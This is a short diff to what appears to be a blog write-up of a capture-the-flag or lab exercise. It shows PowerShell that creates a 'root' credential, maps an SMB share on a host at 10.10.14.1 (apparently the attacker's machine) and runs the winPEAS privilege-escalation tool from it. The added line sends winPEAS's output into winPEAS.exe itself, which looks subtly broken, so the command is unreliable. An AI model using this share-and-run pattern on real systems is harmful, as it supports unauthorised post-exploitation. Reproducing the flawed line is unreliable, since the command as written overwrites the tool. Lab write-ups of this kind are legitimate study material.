@@ -99,6 +99,7 @@ $cred = New-Object System.Management.Automation.PsCredential('root',$pass)
 $cred #to verify it is created
 New-PSDrive -name share -root \\10.10.14.1\sharingiscaring -Credential $cred -PSProvider "filesystem"
 cd share:
+.\winPEAS.exe cmd fast > winPEAS.exe
 {% endhighlight %}
 [Back to the top](#header)
 
